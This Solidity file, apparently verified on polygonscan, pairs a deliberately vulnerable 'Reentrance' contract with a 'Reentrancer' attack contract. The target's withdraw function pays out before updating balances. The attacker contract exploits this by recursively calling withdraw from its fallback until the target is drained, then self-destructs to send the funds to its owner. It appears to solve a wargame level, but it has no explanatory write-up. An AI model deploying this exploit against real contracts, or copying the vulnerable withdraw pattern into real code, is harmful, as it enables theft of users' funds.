/**
 *Submitted for verification at polygonscan.com on 2023-06-17
*/

pragma solidity ^0.6.12;


contract Reentrance {
  
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += (msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Reentrancer {
    Reentrance public reentrance;
    constructor (address payable _reentrance) public {
        reentrance = Reentrance(_reentrance);
    }

    function collect () public payable {
        // initiate the balance with some value
        reentrance.donate.value(msg.value)(address(this));
        // start the recursion
        reentrance.withdraw(msg.value);
    }
  
    function withdraw () public {
        selfdestruct(msg.sender);
    }
  
    fallback() external payable {
        // stop the recursion if there is no longer enough eth in the contract
        if (address(reentrance).balance >= msg.value) {
            // recursively call withdraw that will call this back
            reentrance.withdraw(msg.value);
        }
    }
}